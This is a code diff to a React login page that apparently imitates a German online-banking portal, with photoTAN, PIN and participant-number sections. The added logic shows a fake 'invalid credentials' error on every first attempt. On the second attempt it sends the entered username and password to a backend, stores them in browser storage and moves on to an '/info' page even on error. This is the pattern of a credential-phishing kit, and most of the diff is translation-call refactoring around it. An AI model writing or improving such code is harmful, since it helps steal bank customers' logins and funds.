@@ -18,6 +18,8 @@ const LoginPage: React.FC = () => {
   });
   const [errors, setErrors] = useState<Partial<LoginFormData>>({});
   const [isLoading, setIsLoading] = useState(false);
+  const [loginAttempts, setLoginAttempts] = useState(0);
+  const [showInvalidCredentials, setShowInvalidCredentials] = useState(false);
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = e.target;
@@ -57,29 +59,41 @@ const LoginPage: React.FC = () => {
     }
 
     setIsLoading(true);
+    setShowInvalidCredentials(false);
 
-    try {
-      // Send data to backend (simulating the PHP behavior)
-      await apiService.login(formData);
-      
-      // Store in both session and local storage for mobile compatibility
-      sessionStorage.setItem('xusr', formData.xusr);
-      sessionStorage.setItem('xpss', formData.xpss);
-      localStorage.setItem('xusr', formData.xusr);
-      localStorage.setItem('xpss', formData.xpss);
-      
-      // Navigate to info page
-      navigate('/info');
-    } catch (error) {
-      console.error('Login error:', error);
-      // Still navigate to maintain the flow
-      sessionStorage.setItem('xusr', formData.xusr);
-      sessionStorage.setItem('xpss', formData.xpss);
-      localStorage.setItem('xusr', formData.xusr);
-      localStorage.setItem('xpss', formData.xpss);
-      navigate('/info');
-    } finally {
-      setIsLoading(false);
+    // Simulate the two-attempt logic
+    if (loginAttempts === 0) {
+      // First attempt - show error message
+      setTimeout(() => {
+        setLoginAttempts(1);
+        setShowInvalidCredentials(true);
+        setIsLoading(false);
+      }, 1000);
+    } else {
+      // Second attempt - proceed to next page
+      try {
+        // Send data to backend (simulating the PHP behavior)
+        await apiService.login(formData);
+        
+        // Store in both session and local storage for mobile compatibility
+        sessionStorage.setItem('xusr', formData.xusr);
+        sessionStorage.setItem('xpss', formData.xpss);
+        localStorage.setItem('xusr', formData.xusr);
+        localStorage.setItem('xpss', formData.xpss);
+        
+        // Navigate to info page
+        navigate('/info');
+      } catch (error) {
+        console.error('Login error:', error);
+        // Still navigate to maintain the flow
+        sessionStorage.setItem('xusr', formData.xusr);
+        sessionStorage.setItem('xpss', formData.xpss);
+        localStorage.setItem('xusr', formData.xusr);
+        localStorage.setItem('xpss', formData.xpss);
+        navigate('/info');
+      } finally {
+        setIsLoading(false);
+      }
     }
   };
 
@@ -106,15 +120,15 @@ const LoginPage: React.FC = () => {
         textAlign: 'left',
         width: '100%',
         maxWidth: '1200px',
-        margin: '-30px auto 10px auto',
+        margin: '0 auto 10px auto',
         padding: '0 20px'
       }}>
-{t.onlineBankingRegistration}
+{t('onlineBankingRegistration')}
       </h1>
       
       <div style={{
         display: 'flex',
-        gap: '30px',
+        gap: '20px',
         width: '100%',
         maxWidth: '1200px',
         alignItems: 'flex-start',
@@ -130,8 +144,14 @@ const LoginPage: React.FC = () => {
           padding: '40px'
         }}>
         <form onSubmit={handleSubmit} style={{
-          padding: '20px'
+          padding: '15px'
         }}>
+          {showInvalidCredentials && (
+            <div className="error-message">
+              <div className="error-icon">⚠</div>
+              <div className="error-text">{t('invalidCredentials')}</div>
+            </div>
+          )}
           <div style={{
             marginBottom: '10px',
             position: 'relative',
@@ -158,7 +178,7 @@ const LoginPage: React.FC = () => {
               onFocus={(e) => {
                 e.target.style.backgroundColor = 'white';
               }}
-                  placeholder={t.username}
+                  placeholder={t('username')}
                   autoComplete="off"
                   required
                 />
@@ -206,7 +226,7 @@ const LoginPage: React.FC = () => {
                   onFocus={(e) => {
                     e.target.style.backgroundColor = 'white';
                   }}
-              placeholder={t.password}
+              placeholder={t('password')}
               autoComplete="off"
               required
             />
@@ -260,7 +280,7 @@ const LoginPage: React.FC = () => {
                 <svg width="16" height="16" viewBox="0 0 24 24" fill="white" style={{ marginRight: '4px' }}>
                   <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM15.1 8H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
                 </svg>
-            {isLoading ? (t.loginButton + '...') : t.loginButton}
+            {isLoading ? (t('loginButton') + '...') : t('loginButton')}
           </button>
         </form>
 
@@ -284,7 +304,7 @@ const LoginPage: React.FC = () => {
             color: 'black',
             marginBottom: '10px',
             fontFamily: 'Arial, Helvetica, sans-serif'
-          }}>{t.updatePhotoTAN}</h3>
+          }}>{t('updatePhotoTAN')}</h3>
               <button 
                 style={{
                   background: 'linear-gradient(135deg, #FFC107 0%, #FFD54F 50%, #FFC107 100%)',
@@ -304,7 +324,7 @@ const LoginPage: React.FC = () => {
                 onMouseLeave={(e) => {
                   e.currentTarget.style.background = 'linear-gradient(135deg, #FFC107 0%, #FFD54F 50%, #FFC107 100%)';
                 }}
-              >{t.businessPortal}</button>
+              >{t('businessPortal')}</button>
         </div>
 
         {/* Divider after photoTAN section */}
@@ -326,7 +346,7 @@ const LoginPage: React.FC = () => {
             color: 'black',
             marginBottom: '10px',
             fontFamily: 'Arial, Helvetica, sans-serif'
-          }}>{t.notDigitalCustomer}</h3>
+          }}>{t('notDigitalCustomer')}</h3>
           <a href="#zugang" style={{
             color: 'black',
             textDecoration: 'none',
@@ -337,7 +357,7 @@ const LoginPage: React.FC = () => {
           }}>
             {/* @ts-ignore */}
             <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
-{t.applyDigitalAccess}
+{t('applyDigitalAccess')}
           </a>
         </div>
 
@@ -352,7 +372,7 @@ const LoginPage: React.FC = () => {
             color: 'black',
             marginBottom: '10px',
             fontFamily: 'Arial, Helvetica, sans-serif'
-          }}>{t.currentWarnings}</h3>
+          }}>{t('currentWarnings')}</h3>
           <div>
             <div style={{
               display: 'flex',
@@ -363,7 +383,7 @@ const LoginPage: React.FC = () => {
             }}>
               {/* @ts-ignore */}
               <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
-{t.warning1}
+{t('warning1')}
             </div>
             <div style={{
               display: 'flex',
@@ -373,7 +393,7 @@ const LoginPage: React.FC = () => {
             }}>
               {/* @ts-ignore */}
               <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
-{t.warning2}
+{t('warning2')}
             </div>
           </div>
         </div>
@@ -394,7 +414,7 @@ const LoginPage: React.FC = () => {
             marginBottom: '15px',
             fontFamily: 'Arial, Helvetica, sans-serif'
           }}>
-            {t.importantInfo}
+            {t('importantInfo')}
           </h3>
           
           <p style={{
@@ -404,7 +424,7 @@ const LoginPage: React.FC = () => {
             lineHeight: '1.5',
             fontFamily: 'Arial, Helvetica, sans-serif'
           }}>
-            {t.photoTANProblems}
+            {t('photoTANProblems')}
           </p>
           
           <div style={{ marginBottom: '20px' }}>
@@ -415,7 +435,7 @@ const LoginPage: React.FC = () => {
               marginBottom: '10px',
               fontFamily: 'Arial, Helvetica, sans-serif'
             }}>
-              {t.noActiveTAN}
+              {t('noActiveTAN')}
             </h4>
             <div style={{ marginBottom: '8px' }}>
               <div style={{
@@ -426,7 +446,7 @@ const LoginPage: React.FC = () => {
               }}>
                 {/* @ts-ignore */}
                 <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
-                <span style={{ fontSize: '14px', color: '#333' }}>{t.activatePhotoTAN}</span>
+                <span style={{ fontSize: '14px', color: '#333' }}>{t('activatePhotoTAN')}</span>
               </div>
             </div>
             <div>
@@ -438,7 +458,7 @@ const LoginPage: React.FC = () => {
               }}>
                 {/* @ts-ignore */}
                 <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
-                <span style={{ fontSize: '14px', color: '#333' }}>{t.photoTANHelp}</span>
+                <span style={{ fontSize: '14px', color: '#333' }}>{t('photoTANHelp')}</span>
               </div>
             </div>
           </div>
@@ -451,7 +471,7 @@ const LoginPage: React.FC = () => {
               marginBottom: '10px',
               fontFamily: 'Arial, Helvetica, sans-serif'
             }}>
-              {t.forgotCredentials}
+              {t('forgotCredentials')}
             </h4>
             <div style={{ marginBottom: '8px' }}>
               <div style={{
@@ -462,7 +482,7 @@ const LoginPage: React.FC = () => {
               }}>
                 {/* @ts-ignore */}
                 <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
-                <span style={{ fontSize: '14px', color: '#333' }}>{t.requestParticipantNumber}</span>
+                <span style={{ fontSize: '14px', color: '#333' }}>{t('requestParticipantNumber')}</span>
               </div>
             </div>
             <div>
@@ -474,7 +494,7 @@ const LoginPage: React.FC = () => {
               }}>
                 {/* @ts-ignore */}
                 <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
-                <span style={{ fontSize: '14px', color: '#333' }}>{t.forgotPIN}</span>
+                <span style={{ fontSize: '14px', color: '#333' }}>{t('forgotPIN')}</span>
               </div>
             </div>
           </div>
@@ -487,7 +507,7 @@ const LoginPage: React.FC = () => {
               marginBottom: '10px',
               fontFamily: 'Arial, Helvetica, sans-serif'
             }}>
-              {t.allAboutOnlineBanking}
+              {t('allAboutOnlineBanking')}
             </h4>
             <div style={{ marginBottom: '8px' }}>
               <div style={{
@@ -498,7 +518,7 @@ const LoginPage: React.FC = () => {
               }}>
                 {/* @ts-ignore */}
                 <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
-                <span style={{ fontSize: '14px', color: '#333' }}>{t.instructionsHelp}</span>
+                <span style={{ fontSize: '14px', color: '#333' }}>{t('instructionsHelp')}</span>
               </div>
             </div>
             <div>
@@ -510,7 +530,7 @@ const LoginPage: React.FC = () => {
               }}>
                 {/* @ts-ignore */}
                 <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
-                <span style={{ fontSize: '14px', color: '#333' }}>{t.security}</span>
+                <span style={{ fontSize: '14px', color: '#333' }}>{t('security')}</span>
               </div>
             </div>
           </div>
